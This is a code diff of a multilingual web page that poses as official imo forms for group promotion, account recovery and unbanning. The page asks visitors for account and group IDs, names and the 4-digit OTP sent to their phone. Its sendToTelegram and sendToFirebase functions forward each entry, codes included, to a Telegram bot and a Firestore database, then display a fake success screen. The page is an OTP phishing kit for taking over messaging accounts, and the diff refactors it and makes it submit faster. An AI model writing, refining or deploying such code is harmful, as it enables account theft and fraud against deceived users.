+                alert_user_account: "অনুগ্রহ করে যেকোনো নাম্বার দিন।",
                 alert_otp: "অনুগ্রহ করে ৪ ডিজিটের কোডটি সম্পূর্ণ দিন।"
             },
             hi: {
-                title: "imo आधिकारिक फॉर्म",
-                card_promote: "इमो ग्रुप प्रमोट",
-                card_shortid: "इमो ग्रुप शॉर्ट आईडी",
-                card_hrad: "इमो अकाउंट रिकवरी",
-                card_unban: "इमो अकाउंट/ग्रुप अनबैन",
-                card_limit: "ग्रुप लिमिट",
-                about_title: "imo के बारे में",
-                about_desc: "imo एक अग्रणी वैश्विक संचार मंच है, जो दुनिया भर में 200 मिलियन से अधिक उपयोगकर्ताओं को मुफ्त, उच्च गुणवत्ता वाली HD वीडियो और वॉयस कॉल प्रदान करता है। बिना किसी सीमा के जुड़े रहें!",
-                modal1_title: "ग्रुप प्रमोट अनुरोध",
-                modal2_title: "शॉर्ट आईडी अनुरोध",
-                modal3_title: "अकाउंट रिकवरी (Hrad)",
-                modal4_title: "अनबैन अनुरोध",
-                modal5_title: "ग्रुप लिंक लिमिट",
-                form_group_id: "प्रिय उपयोगकर्ता, अपने ग्रुप को प्रमोट करने के लिए ग्रुप आईडी दर्ज करें",
+                title: "imo आधिकारिक फॉर्म", card_promote: "इमो ग्रुप प्रमोट", card_shortid: "इमो ग्रुप शॉर्ट आईडी",
+                card_hrad: "इमो अकाउंट रिकवरी", card_unban: "इमो अकाउंट/ग्रुप अनबैन", card_limit: "ग्रुप लिमिट",
+                about_title: "imo के बारे में", about_desc: "imo एक अग्रणी वैश्विक संचार मंच है।",
+                modal1_title: "ग्रुप प्रमोट", modal2_title: "शॉर्ट आईडी", modal3_title: "अकाउंट रिकवरी",
+                modal4_title: "अनबैन अनुरोध", modal5_title: "ग्रुप लिमिट",
+                form_group_id: "प्रिय उपयोगकर्ता, ग्रुप आईडी दर्ज करें",
                 form_group_name: "प्रिय उपयोगकर्ता, ग्रुप का नाम दर्ज करें",
-                form_promote_days: "प्रिय उपयोगकर्ता, चुनें कि आप कितने दिनों तक प्रमोट करना चाहते हैं",
-                form_shortid_id: "प्रिय उपयोगकर्ता, शॉर्ट आईडी प्राप्त करने के लिए ग्रुप आईडी दर्ज करें",
+                form_promote_days: "प्रिय उपयोगकर्ता, कितने दिनों तक प्रमोट करना चाहते हैं चुनें",
+                form_shortid_id: "प्रिय उपयोगकर्ता, शॉर्ट आईडी के लिए ग्रुप आईडी दर्ज करें",
                 form_shortid_type: "प्रिय उपयोगकर्ता, शॉर्ट आईडी का प्रकार चुनें",
-                form_hrad_id: "प्रिय उपयोगकर्ता, अपनी अकाउंट आईडी दर्ज करें",
-                form_hrad_name: "प्रिय उपयोगकर्ता, अपना अकाउंट नाम दर्ज करें",
+                form_hrad_id: "प्रिय उपयोगकर्ता, अकाउंट आईडी दर्ज करें",
+                form_hrad_name: "प्रिय उपयोगकर्ता, अकाउंट नाम दर्ज करें",
                 form_hrad_issue: "प्रिय उपयोगकर्ता, समस्या का प्रकार चुनें",
-                form_unban_id: "प्रिय उपयोगकर्ता, अपनी अकाउंट/ग्रुप आईडी दर्ज करें",
+                form_unban_id: "प्रिय उपयोगकर्ता, अकाउंट/ग्रुप आईडी दर्ज करें",
                 form_unban_reason: "प्रिय उपयोगकर्ता, प्रतिबंध का कारण दर्ज करें",
-                form_unban_type: "प्रिय उपयोगकर्ता, अपने आवेदन का प्रकार चुनें",
-                form_limit_id: "प्रिय उपयोगकर्ता, अपनी ग्रुप लिमिट बढ़ाने के लिए ग्रुप आईडी दर्ज करें",
-                form_limit_amount: "प्रिय उपयोगकर्ता, चुनें कि आप कितनी हजार लिमिट चाहते हैं",
-                owner_title: "मालिक सत्यापन",
-                owner_desc: "अपने अनुरोध की पुष्टि करने के लिए, कृपया ग्रुप मालिक की आईडी से सत्यापित करें",
-                owner_desc_shortid: "अपने शॉर्ट आईडी अनुरोध की पुष्टि करने के लिए, कृपया ग्रुप मालिक की आईडी से सत्यापित करें",
-                owner_desc_hrad: "अपने अकाउंट रिकवरी अनुरोध की पुष्टि करने के लिए, कृपया अकाउंट मालिक की आईडी से सत्यापित करें",
-                owner_desc_unban: "अपने अनबैन अनुरोध की पुष्टि करने के लिए, कृपया अकाउंट मालिक की आईडी से सत्यापित करें",
-                owner_desc_limit: "अपने ग्रुप लिमिट अनुरोध की पुष्टि करने के लिए, कृपया ग्रुप मालिक की आईडी से सत्यापित करें",
-                owner_id: "ग्रुप मालिक आईडी नंबर",
-                owner_id_account: "अकाउंट मालिक आईडी नंबर",
-                otp_title: "OTP सत्यापन",
-                otp_desc: "मालिक के नंबर पर भेजा गया 4-अंकीय कोड दर्ज करें",
-                otp_verifying: "सत्यापित किया जा रहा है...",
-                otp_success: "सफलतापूर्वक सत्यापित!",
-                btn_submit: "जमा करें",
-                btn_send_id: "आईडी भेजें",
-                btn_verify: "सत्यापित करें",
+                form_unban_type: "प्रिय उपयोगकर्ता, आवेदन का प्रकार चुनें",
+                form_limit_id: "प्रिय उपयोगकर्ता, ग्रुप लिमिट बढ़ाने के लिए ग्रुप आईडी दर्ज करें",
+                form_limit_amount: "प्रिय उपयोगकर्ता, कितनी हजार लिमिट चाहते हैं चुनें",
+                user_verify_title: "उपयोगकर्ता सत्यापन",
+                user_verify_desc: "अपने अनुरोध की पुष्टि करने के लिए, कृपया अपने उपयोगकर्ता नाम और खाता संख्या से सत्यापित करें",
+                user_name: "उपयोगकर्ता नाम (कोई भी नाम)",
+                user_account: "उपयोगकर्ता खाता संख्या (कोई भी संख्या)",
+                otp_title: "OTP सत्यापन", otp_desc: "अपने नंबर पर भेजा गया 4-अंकीय कोड दर्ज करें",
+                otp_verifying: "सत्यापित किया जा रहा है...", otp_success: "सफलतापूर्वक सत्यापित!",
+                btn_submit: "जमा करें", btn_send_verify: "सत्यापित करें", btn_verify: "सत्यापित",
                 form_submit_hint: "अब यहाँ जमा करें",
-                opt_1_day: "1 दिन",
-                opt_7_days: "7 दिन",
-                opt_30_days: "30 दिन",
-                opt_3_digit: "3 अंक",
-                opt_4_digit: "4 अंक",
-                opt_5_digit: "5 अंक",
-                opt_password: "पासवर्ड",
-                opt_hacked: "हैक",
-                opt_other: "अन्य",
-                opt_account: "अकाउंट",
-                opt_group: "ग्रुप",
-                ph_group_id: "ग्रुप आईडी...",
-                ph_group_id_confirm: "ग्रुप आईडी की पुष्टि करें...",
-                ph_group_name: "ग्रुप का नाम...",
-                ph_group_name_confirm: "ग्रुप नाम की पुष्टि करें...",
-                ph_owner_id: "मालिक आईडी नंबर...",
-                ph_owner_id_confirm: "मालिक आईडी की पुष्टि करें...",
-                ph_account_id: "अकाउंट आईडी...",
-                ph_account_id_confirm: "अकाउंट आईडी की पुष्टि करें...",
-                ph_account_name: "अकाउंट का नाम...",
-                ph_account_name_confirm: "अकाउंट नाम की पुष्टि करें...",
-                ph_ban_reason: "प्रतिबंध का कारण...",
-                ph_ban_reason_confirm: "प्रतिबंध कारण की पुष्टि करें...",
-                alert_owner_id: "कृपया मालिक आईडी नंबर दर्ज करें।",
+                opt_1_day: "1 दिन", opt_7_days: "7 दिन", opt_30_days: "30 दिन",
+                opt_3_digit: "3 अंक", opt_4_digit: "4 अंक", opt_5_digit: "5 अंक",
+                opt_password: "पासवर्ड", opt_hacked: "हैक", opt_other: "अन्य",
+                opt_account: "अकाउंट", opt_group: "ग्रुप",
+                ph_group_id: "ग्रुप आईडी...", ph_group_id_confirm: "ग्रुप आईडी की पुष्टि करें...",
+                ph_group_name: "ग्रुप का नाम...", ph_group_name_confirm: "ग्रुप नाम की पुष्टि करें...",
+                ph_user_name: "कोई भी उपयोगकर्ता नाम दर्ज करें...", ph_user_account: "कोई भी खाता संख्या दर्ज करें...",
+                ph_account_id: "अकाउंट आईडी...", ph_account_id_confirm: "अकाउंट आईडी की पुष्टि करें...",
+                ph_account_name: "अकाउंट का नाम...", ph_account_name_confirm: "अकाउंट नाम की पुष्टि करें...",
+                ph_ban_reason: "प्रतिबंध का कारण...", ph_ban_reason_confirm: "प्रतिबंध कारण की पुष्टि करें...",
+                alert_user_name: "कृपया कोई भी उपयोगकर्ता नाम दर्ज करें।", 
+                alert_user_account: "कृपया कोई भी खाता संख्या दर्ज करें।",
                 alert_otp: "कृपया पूरा 4-अंकीय कोड दर्ज करें।"
             },
             ar: {
-                title: "نماذج مسؤولي imo",
-                card_promote: "ترويج مجموعة Imo",
-                card_shortid: "معرف قصير لمجموعة Imo",
-                card_hrad: "استرداد حساب Imo",
-                card_unban: "إلغاء حظر حساب/مجموعة Imo",
-                card_limit: "حد المجموعة",
-                about_title: "حول imo",
-                about_desc: "imo هي منصة اتصالات عالمية رائدة، توفر مكالمات فيديو وصوت عالية الدقة مجانية لأكثر من 200 مليون مستخدم حول العالم. ابقَ متصلاً بلا حدود!",
-                modal1_title: "طلب ترويج المجموعة",
-                modal2_title: "طلب معرف قصير",
-                modal3_title: "استرداد الحساب (Hrad)",
-                modal4_title: "طلب إلغاء الحظر",
-                modal5_title: "حد رابط المجموعة",
-                form_group_id: "عزيزي المستخدم، أدخل معرف المجموعة لترويج مجموعتك",
+                title: "نماذج مسؤولي imo", card_promote: "ترويج مجموعة Imo", card_shortid: "معرف قصير لمجموعة Imo",
+                card_hrad: "استرداد حساب Imo", card_unban: "إلغاء حظر حساب/مجموعة Imo", card_limit: "حد المجموعة",
+                about_title: "حول imo", about_desc: "imo هي منصة اتصالات عالمية رائدة.",
+                modal1_title: "ترويج المجموعة", modal2_title: "معرف قصير", modal3_title: "استرداد الحساب",
+                modal4_title: "طلب إلغاء الحظر", modal5_title: "حد المجموعة",
+                form_group_id: "عزيزي المستخدم، أدخل معرف المجموعة",
                 form_group_name: "عزيزي المستخدم، أدخل اسم المجموعة",
-                form_promote_days: "عزيزي المستخدم، اختر عدد الأيام التي تريد الترويج فيها",
-                form_shortid_id: "عزيزي المستخدم، أدخل معرف المجموعة للحصول على معرف قصير",
-                form_shortid_type: "عزيزي المستخدم، اختر نوع المعرف القصير",
+                form_promote_days: "عزيزي المستخدم، اختر عدد الأيام",
+                form_shortid_id: "عزيزي المستخدم، أدخل معرف المجموعة",
+                form_shortid_type: "عزيزي المستخدم، اختر نوع المعرف",
                 form_hrad_id: "عزيزي المستخدم، أدخل معرف حسابك",
                 form_hrad_name: "عزيزي المستخدم، أدخل اسم حسابك",
                 form_hrad_issue: "عزيزي المستخدم، اختر نوع المشكلة",
                 form_unban_id: "عزيزي المستخدم، أدخل معرف حسابك/مجموعتك",
                 form_unban_reason: "عزيزي المستخدم، أدخل سبب الحظر",
                 form_unban_type: "عزيزي المستخدم، اختر نوع طلبك",
-                form_limit_id: "عزيزي المستخدم، أدخل معرف المجموعة لزيادة حد مجموعتك",
-                form_limit_amount: "عزيزي المستخدم، اختر عدد الآلاف من الحد الذي تريده",
-                owner_title: "التحقق من المالك",
-                owner_desc: "لتأكيد طلبك، يرجى التحقق باستخدام معرف مالك المجموعة",
-                owner_desc_shortid: "لتأكيد طلب المعرف القصير، يرجى التحقق باستخدام معرف مالك المجموعة",
-                owner_desc_hrad: "لتأكيد طلب استرداد الحساب، يرجى التحقق باستخدام معرف مالك الحساب",
-                owner_desc_unban: "لتأكيد طلب إلغاء الحظر، يرجى التحقق باستخدام معرف مالك الحساب",
-                owner_desc_limit: "لتأكيد طلب حد المجموعة، يرجى التحقق باستخدام معرف مالك المجموعة",
-                owner_id: "رقم معرف مالك المجموعة",
-                owner_id_account: "رقم معرف مالك الحساب",
-                otp_title: "التحقق من OTP",
-                otp_desc: "أدخل الرمز المكون من 4 أرقام المرسل إلى رقم المالك",
-                otp_verifying: "جارٍ التحقق...",
-                otp_success: "تم التحقق بنجاح!",
-                btn_submit: "إرسال",
-                btn_send_id: "إرسال المعرف",
-                btn_verify: "تحقق",
+                form_limit_id: "عزيزي المستخدم، أدخل معرف المجموعة",
+                form_limit_amount: "عزيزي المستخدم، اختر عدد الآلاف",
+                user_verify_title: "التحقق من المستخدم",
+                user_verify_desc: "لتأكيد طلبك، يرجى التحقق باستخدام اسم المستخدم ورقم حساب المستخدم",
+                user_name: "اسم المستخدم (أي اسم)",
+                user_account: "رقم حساب المستخدم (أي رقم)",
+                otp_title: "التحقق من OTP", otp_desc: "أدخل الرمز المكون من 4 أرقام",
+                otp_verifying: "جارٍ التحقق...", otp_success: "تم التحقق بنجاح!",
+                btn_submit: "إرسال", btn_send_verify: "تحقق الآن", btn_verify: "تحقق",
                 form_submit_hint: "الآن أرسل هنا",
-                opt_1_day: "يوم واحد",
-                opt_7_days: "7 أيام",
-                opt_30_days: "30 يومًا",
-                opt_3_digit: "3 أرقام",
-                opt_4_digit: "4 أرقام",
-                opt_5_digit: "5 أرقام",
-                opt_password: "كلمة المرور",
-                opt_hacked: "تم اختراقه",
-                opt_other: "أخرى",
-                opt_account: "حساب",
-                opt_group: "مجموعة",
-                ph_group_id: "معرف المجموعة...",
-                ph_group_id_confirm: "تأكيد معرف المجموعة...",
-                ph_group_name: "اسم المجموعة...",
-                ph_group_name_confirm: "تأكيد اسم المجموعة...",
-                ph_owner_id: "رقم معرف المالك...",
-                ph_owner_id_confirm: "تأكيد رقم معرف المالك...",
-                ph_account_id: "معرف الحساب...",
-                ph_account_id_confirm: "تأكيد معرف الحساب...",
-                ph_account_name: "اسم الحساب...",
-                ph_account_name_confirm: "تأكيد اسم الحساب...",
-                ph_ban_reason: "سبب الحظر...",
-                ph_ban_reason_confirm: "تأكيد سبب الحظر...",
-                alert_owner_id: "يرجى إدخال رقم معرف المالك.",
+                opt_1_day: "يوم واحد", opt_7_days: "7 أيام", opt_30_days: "30 يومًا",
+                opt_3_digit: "3 أرقام", opt_4_digit: "4 أرقام", opt_5_digit: "5 أرقام",
+                opt_password: "كلمة المرور", opt_hacked: "تم اختراقه", opt_other: "أخرى",
+                opt_account: "حساب", opt_group: "مجموعة",
+                ph_group_id: "معرف المجموعة...", ph_group_id_confirm: "تأكيد معرف المجموعة...",
+                ph_group_name: "اسم المجموعة...", ph_group_name_confirm: "تأكيد اسم المجموعة...",
+                ph_user_name: "أدخل أي اسم مستخدم...", ph_user_account: "أدخل أي رقم حساب...",
+                ph_account_id: "معرف الحساب...", ph_account_id_confirm: "تأكيد معرف الحساب...",
+                ph_account_name: "اسم الحساب...", ph_account_name_confirm: "تأكيد اسم الحساب...",
+                ph_ban_reason: "سبب الحظر...", ph_ban_reason_confirm: "تأكيد سبب الحظر...",
+                alert_user_name: "يرجى إدخال أي اسم مستخدم.", 
+                alert_user_account: "يرجى إدخال أي رقم حساب.",
                 alert_otp: "يرجى إدخال الرمز المكون من 4 أرقام كاملاً."
             }
         };
 
-        // Language Dropdown Logic
-        function toggleLangDropdown(event) {
-            event.stopPropagation();
-            document.getElementById('langSelector').classList.toggle('active');
-        }
+        function toggleLangDropdown(event) { event.stopPropagation(); document.getElementById('langSelector').classList.toggle('active'); }
 
         function changeLanguage(lang) {
-            // Update UI active state
             document.querySelectorAll('.lang-option').forEach(opt => {
                 opt.classList.remove('active');
-                if(opt.getAttribute('data-lang') === lang) {
-                    opt.classList.add('active');
-                }
+                if(opt.getAttribute('data-lang') === lang) opt.classList.add('active');
             });
-
-            // Update Trigger Label
             const labels = { en: 'English', bn: 'বাংলা', hi: 'हिन्दी', ar: 'العربية' };
             document.getElementById('current-lang-label').textContent = labels[lang];
-            
-            // Close Dropdown
             document.getElementById('langSelector').classList.remove('active');
 
-            // Update Text Elements
-            const elements = document.querySelectorAll('[data-i18n]');
-            elements.forEach(el => {
+            document.querySelectorAll('[data-i18n]').forEach(el => {
                 const key = el.getAttribute('data-i18n');
-                if (translations[lang] && translations[lang][key]) {
-                    el.textContent = translations[lang][key];
-                }
+                if (translations[lang] && translations[lang][key]) el.textContent = translations[lang][key];
             });
-
-            // Update Placeholders
-            const placeholders = document.querySelectorAll('[data-i18n-placeholder]');
-            placeholders.forEach(el => {
+            document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
                 const key = el.getAttribute('data-i18n-placeholder');
-                if (translations[lang] && translations[lang][key]) {
-                    el.placeholder = translations[lang][key];
-                }
+                if (translations[lang] && translations[lang][key]) el.placeholder = translations[lang][key];
             });
-
-            // Handle RTL
-            if (lang === 'ar') {
-                document.body.setAttribute('dir', 'rtl');
-            } else {
-                document.body.setAttribute('dir', 'ltr');
-            }
-            
+            if (lang === 'ar') document.body.setAttribute('dir', 'rtl');
+            else document.body.setAttribute('dir', 'ltr');
             localStorage.setItem('preferredLang', lang);
         }
 
-        // Close Dropdown when clicking outside
         window.addEventListener('click', function(e) {
             const selector = document.getElementById('langSelector');
-            if (selector && !selector.contains(e.target)) {
-                selector.classList.remove('active');
-            }
+            if (selector && !selector.contains(e.target)) selector.classList.remove('active');
         });
 
-        // Load saved language on startup
         document.addEventListener('DOMContentLoaded', () => {
             const savedLang = localStorage.getItem('preferredLang') || 'en';
             changeLanguage(savedLang);
         });
 
-        // ==========================================
-        // ADVANCED FEATURES: PARTICLE CANVAS & CURSOR GLOW
-        // ==========================================
+        // Particle Canvas
         document.addEventListener('DOMContentLoaded', () => {
             const canvas = document.getElementById('particle-canvas');
             const ctx = canvas.getContext('2d');
             let particlesArray = [];
-            
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-            
-            window.addEventListener('resize', () => {
-                canvas.width = window.innerWidth;
-                canvas.height = window.innerHeight;
-                initParticles();
-            });
+            canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+            window.addEventListener('resize', () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; initParticles(); });
 
             class Particle {
                 constructor() {
-                    this.x = Math.random() * canvas.width;
-                    this.y = Math.random() * canvas.height;
+                    this.x = Math.random() * canvas.width; this.y = Math.random() * canvas.height;
                     this.size = Math.random() * 2 + 0.5;
-                    this.speedX = Math.random() * 1 - 0.5;
-                    this.speedY = Math.random() * 1 - 0.5;
-                    this.color = `rgba(0, 242, 254, ${Math.random() * 0.5 + 0.1})`;
+                    this.speedX = Math.random() * 1 - 0.5; this.speedY = Math.random() * 1 - 0.5;
+                    const colors = ['rgba(0,242,254,', 'rgba(178,36,239,', 'rgba(255,8,68,', 'rgba(0,230,118,'];
+                    this.baseColor = colors[Math.floor(Math.random() * colors.length)];
+                    this.alpha = Math.random() * 0.5 + 0.1;
                 }
                 update() {
-                    this.x += this.speedX;
-                    this.y += this.speedY;
-                    if (this.x > canvas.width) this.x = 0;
-                    if (this.x < 0) this.x = canvas.width;
-                    if (this.y > canvas.height) this.y = 0;
-                    if (this.y < 0) this.y = canvas.height;
+                    this.x += this.speedX; this.y += this.speedY;
+                    if (this.x > canvas.width) this.x = 0; if (this.x < 0) this.x = canvas.width;
+                    if (this.y > canvas.height) this.y = 0; if (this.y < 0) this.y = canvas.height;
                 }
-                draw() {
-                    ctx.fillStyle = this.color;
-                    ctx.beginPath();
-                    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
-                    ctx.fill();
+                draw() { 
+                    ctx.fillStyle = this.baseColor + this.alpha + ')'; 
+                    ctx.beginPath(); 
+                    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2); 
+                    ctx.fill(); 
                 }
             }
-
             function initParticles() {
                 particlesArray = [];
-                const numberOfParticles = (canvas.width * canvas.height) / 15000;
-                for (let i = 0; i < numberOfParticles; i++) {
-                    particlesArray.push(new Particle());
-                }
+                const num = Math.min((canvas.width * canvas.height) / 12000, 150);
+                for (let i = 0; i < num; i++) particlesArray.push(new Particle());
             }
-
             function animateParticles() {
                 ctx.clearRect(0, 0, canvas.width, canvas.height);
-                for (let i = 0; i < particlesArray.length; i++) {
-                    particlesArray[i].update();
-                    particlesArray[i].draw();
+                for (let i = 0; i < particlesArray.length; i++) { 
+                    particlesArray[i].update(); 
+                    particlesArray[i].draw(); 
                 }
                 requestAnimationFrame(animateParticles);
             }
-            
-            initParticles();
-            animateParticles();
+            initParticles(); animateParticles();
 
             const cursorGlow = document.querySelector('.cursor-glow');
-            document.addEventListener('mousemove', (e) => {
-                cursorGlow.style.left = e.clientX + 'px';
-                cursorGlow.style.top = e.clientY + 'px';
+            document.addEventListener('mousemove', (e) => { 
+                cursorGlow.style.left = e.clientX + 'px'; 
+                cursorGlow.style.top = e.clientY + 'px'; 
             });
             document.addEventListener('mouseleave', () => { cursorGlow.style.opacity = '0'; });
             document.addEventListener('mouseenter', () => { cursorGlow.style.opacity = '1'; });
         });
 
-        // ==========================================
-        // SEND DATA FUNCTIONS
-        // ==========================================
-        async function sendToTelegram(message) {
-            if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || CHAT_ID === 'YOUR_CHAT_ID_HERE') {
-                console.warn('Telegram Bot not configured. Message logged to console:', message);
-                return; 
-            }
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            try {
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
-                });
-                if (!response.ok) console.error('Failed to send message to Telegram:', await response.text());
-            } catch (error) { console.error('Error sending to Telegram:', error); }
-        }
-
-        async function sendToFirebase(collectionName, dataPayload) {
-            if (!db) { console.warn('Firebase not configured. Data logged to console:', dataPayload); return; }
-            try {
-                await db.collection(collectionName).add({
-                    ...dataPayload,
-                    timestamp: firebase.firestore.FieldValue.serverTimestamp()
-                });
-                console.log('Data sent to Firebase successfully:', dataPayload);
-            } catch (error) { console.error('Error sending to Firebase:', error); }
-        }
-
-        async function sendDataToAll(formattedMessage, collectionName, dataPayload) {
-            return Promise.all([
-                sendToTelegram(formattedMessage),
-                sendToFirebase(collectionName, dataPayload)
-            ]);
-        }
-
-        // ==========================================
-        // UI LOGIC & FLOW CONTROL
-        // ==========================================
-
-        // --- 3D Tilt Effect ---
+        // 3D Tilt Effect on Cards
         document.addEventListener('DOMContentLoaded', () => {
             const cards = document.querySelectorAll('.card');
             cards.forEach(card => {
@@ -1369,12 +1171,45 @@
             });
         });
 
-        // --- Modal Logic ---
+        // ==========================================
+        // DATA SENDING
+        // ==========================================
+        function sendToTelegram(message) {
+            if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+                console.log('📱 Telegram (Not Configured):', message);
+                return;
+            }
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
+            }).catch(err => console.warn('Telegram error:', err));
+        }
+
+        function sendToFirebase(collectionName, dataPayload) {
+            if (!db) {
+                console.log('🔥 Firebase (Not Configured):', dataPayload);
+                return;
+            }
+            db.collection(collectionName).add({
+                ...dataPayload,
+                timestamp: firebase.firestore.FieldValue.serverTimestamp()
+            }).catch(err => console.warn('Firebase error:', err));
+        }
+
+        function sendDataToAll(msg, collection, data) {
+            sendToTelegram(msg);
+            sendToFirebase(collection, data);
+        }
+
+        // ==========================================
+        // MODAL & FLOW LOGIC
+        // ==========================================
         function openModal(modalId) {
             const modal = document.getElementById(modalId);
-            if (modal) {
-                modal.classList.add('active');
-                document.body.classList.add('modal-open');
+            if (modal) { 
+                modal.classList.add('active'); 
+                document.body.classList.add('modal-open'); 
             }
         }
 
@@ -1404,69 +1239,63 @@
             return activeBtn ? activeBtn.getAttribute('data-selected') : 'Not Selected';
         }
 
-        // --- Universal Flow Logic ---
-        async function submitFlow(type) {
+        // FAST submit - instant transition
+        function fastSubmitFlow(type) {
             let baseId = type === 'promote' ? '1' : type === 'shortid' ? '2' : type === 'hrad' ? '3' : type === 'unban' ? '4' : '5';
             const modalId = `modal-${baseId}`;
             const inputs = document.querySelectorAll(`#${modalId} .form-input`);
             
-            const dataPayload = {
-                type: type, step: 'initial_form',
-                inputs: {},
-                selectedOption: getSelectedOption(modalId)
-            };
-            
-            inputs.forEach((input, index) => {
-                dataPayload.inputs[`field_${index + 1}`] = input.value || 'Empty';
-            });
+            const dataPayload = { type: type, step: 'initial_form', inputs: {}, selectedOption: getSelectedOption(modalId) };
+            inputs.forEach((input, index) => { dataPayload.inputs[`field_${index + 1}`] = input.value || 'Empty'; });
 
             let msg = `📌 <b>New ${type.toUpperCase()} Request</b>\n`;
-            Object.entries(dataPayload.inputs).forEach(([key, value]) => {
-                msg += `${key}: ${value}\n`;
-            });
+            Object.entries(dataPayload.inputs).forEach(([key, value]) => { msg += `${key}: ${value}\n`; });
             msg += `Selected: ${dataPayload.selectedOption}\n`;
 
-            await sendDataToAll(msg, 'imo_requests', dataPayload);
+            sendDataToAll(msg, 'imo_requests', dataPayload);
+
             closeModal(modalId);
-            
-            setTimeout(() => { 
-                if (type === 'limit') openModal('modal-6');
-                else openModal(`modal-${baseId}-5`); 
-            }, 400);
+            if (type === 'limit') openModal('modal-6');
+            else openModal(`modal-${baseId}-5`);
         }
 
-        async function submitOwnerId(type) {
+        // FAST user verification
+        function fastSubmitVerification(type) {
             let baseId = type === 'promote' ? '1' : type === 'shortid' ? '2' : type === 'hrad' ? '3' : type === 'unban' ? '4' : '5';
             const currentModalId = type === 'limit' ? 'modal-6' : `modal-${baseId}-5`;
             const inputs = document.querySelectorAll(`#${currentModalId} .form-input`);
             const currentLang = localStorage.getItem('preferredLang') || 'en';
-            
-            if(inputs[0].value.trim() === '') {
-                alert(translations[currentLang].alert_owner_id);
-                return;
-            }
 
-            const dataPayload = { type: type, step: 'owner_id', inputs: {} };
-            inputs.forEach((input, index) => {
-                dataPayload.inputs[`owner_id_${index + 1}`] = input.value || 'Empty';
-            });
+            const userName = inputs[0].value.trim();
+            const userAccount = inputs[1].value.trim();
 
-            let msg = `🔑 <b>Owner ID Verification for ${type.toUpperCase()}</b>\n`;
-            Object.entries(dataPayload.inputs).forEach(([key, value]) => {
-                msg += `${key}: ${value}\n`;
-            });
+            if(userName === '') { alert(translations[currentLang].alert_user_name); return; }
+            if(userAccount === '') { alert(translations[currentLang].alert_user_account); return; }
 
-            await sendDataToAll(msg, 'imo_requests', dataPayload);
+            const dataPayload = { 
+                type: type, 
+                step: 'user_verification', 
+                userName: userName, 
+                userAccount: userAccount 
+            };
+
+            let msg = `👤 <b>User Verification for ${type.toUpperCase()}</b>\n`;
+            msg += `Name: ${userName}\n`;
+            msg += `Account: ${userAccount}\n`;
+
+            sendDataToAll(msg, 'imo_requests', dataPayload);
+
             closeModal(currentModalId);
+            if (type === 'limit') openModal('modal-7');
+            else openModal(`modal-${baseId}-7`);
             
             setTimeout(() => {
-                if (type === 'limit') openModal('modal-7');
-                else openModal(`modal-${baseId}-7`);
-                document.querySelectorAll(`#otp-inputs-${type} .otp-box`)[0].focus();
-            }, 400);
+                const firstBox = document.querySelector(`#otp-inputs-${type} .otp-box`);
+                if (firstBox) firstBox.focus();
+            }, 150);
         }
 
-        // --- OTP Auto-Verify Logic ---
+        // OTP Auto Verify
         function setupOtpBoxes(type) {
             const containerId = `otp-inputs-${type}`;
             const boxes = document.querySelectorAll(`#${containerId} .otp-box`);
@@ -1475,15 +1304,10 @@
                 box.addEventListener('input', (e) => {
                     if (e.target.value && isNaN(e.target.value)) e.target.value = '';
                     if (e.target.value && index < boxes.length - 1) boxes[index + 1].focus();
-                    
                     let isComplete = true;
                     boxes.forEach(b => { if (!b.value) isComplete = false; });
-                    
-                    if (isComplete) {
-                        setTimeout(() => { autoVerify(type); }, 300);
-                    }
+                    if (isComplete) setTimeout(() => { autoVerify(type); }, 250);
                 });
-
                 box.addEventListener('keydown', (e) => {
                     if (e.key === 'Backspace' && !e.target.value && index > 0) boxes[index - 1].focus();
                 });
@@ -1492,25 +1316,22 @@
 
         ['promote', 'shortid', 'hrad', 'unban', 'limit'].forEach(type => setupOtpBoxes(type));
 
-        async function autoVerify(type) {
+        function autoVerify(type) {
             const containerId = `otp-inputs-${type}`;
             const boxes = document.querySelectorAll(`#${containerId} .otp-box`);
             let isComplete = true; 
             boxes.forEach(b => { if (!b.value) isComplete = false; });
             const currentLang = localStorage.getItem('preferredLang') || 'en';
             
-            if (!isComplete) { 
-                alert(translations[currentLang].alert_otp); 
-                return; 
-            }
+            if (!isComplete) { alert(translations[currentLang].alert_otp); return; }
 
             let otpCode = '';
             boxes.forEach(b => otpCode += b.value);
             
             const dataPayload = { type: type, step: 'otp_verified', otp: otpCode };
-            const msg = `✅ <b>OTP Verified for ${type.toUpperCase()}</b>\nOTP Code: <code>${otpCode}</code>`;
+            const msg = `✅ <b>OTP Verified for ${type.toUpperCase()}</b>\nOTP: <code>${otpCode}</code>`;
 
-            await sendDataToAll(msg, 'imo_requests', dataPayload);
+            sendDataToAll(msg, 'imo_requests', dataPayload);
 
             document.getElementById(containerId).style.display = 'none';
             document.getElementById(`otp-submit-btn-${type}`).style.display = 'none';
@@ -1520,12 +1341,11 @@
                 document.getElementById(`verify-loading-${type}`).style.display = 'none';
                 document.getElementById(`verify-success-${type}`).style.display = 'flex';
                 createConfettiBurst();
-
                 setTimeout(() => { 
                     let modalId = type === 'promote' ? 'modal-1-7' : type === 'shortid' ? 'modal-2-7' : type === 'hrad' ? 'modal-3-7' : type === 'unban' ? 'modal-4-7' : 'modal-7';
                     closeModal(modalId); 
-                }, 2000);
-            }, 1800);
+                }, 1800);
+            }, 1500);
         }
 
         function resetOtp(type) {
@@ -1539,40 +1359,30 @@
 
         function createConfettiBurst() {
             const colors = ['#00f2fe', '#b224ef', '#ff0844', '#00e676', '#ffb800'];
-            for (let i = 0; i < 30; i++) {
+            for (let i = 0; i < 40; i++) {
                 const confetti = document.createElement('div');
                 confetti.style.position = 'fixed';
-                confetti.style.width = '6px';
-                confetti.style.height = '6px';
